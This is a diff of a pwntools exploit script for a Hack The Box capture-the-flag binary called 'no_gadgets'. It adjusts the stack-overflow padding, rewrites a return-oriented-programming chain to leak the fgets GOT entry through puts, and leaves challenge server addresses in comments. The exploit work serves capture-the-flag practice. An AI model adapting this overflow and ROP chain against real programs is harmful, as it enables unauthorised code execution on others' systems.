@@ -15,7 +15,7 @@ elf = ELF('./no_gadgets')
 
 padding = offset0*b'A'
 padding += offset1*b'\x00'
-padding += offset2*b'B'
+padding += p64(0x404000)
 
 #ip, port='161.35.168.118', 30070
 #ip, port = '83.136.250.41', 46944   #HTB
@@ -25,7 +25,8 @@ io = process('./no_gadgets')
 
 #gets + system
 #rop_chain = p64(elf.got.gets) + p64(elf.got.system)  #ERROR! Should call PLT/SYM!!
-rop_chain = p64(elf.sym.fgets) + p64(elf.sym.puts)
+#rop_chain = p64(elf.sym.fgets) + p64(elf.sym.puts)  #rdi/rsi/rdx not correct!
+rop_chain = p64(0x40121b) + p64(elf.sym.puts)	#actually 'call' fgets, break this stack
 
 payload = padding + rop_chain
 
@@ -33,6 +34,7 @@ io.recvuntil('Data:')
 io.sendline(payload)
 cmd = p64(elf.got.fgets)
 io.sendline(cmd)
+print(io.recvline())
 print(io.recvline())
 #io.interactive()
 
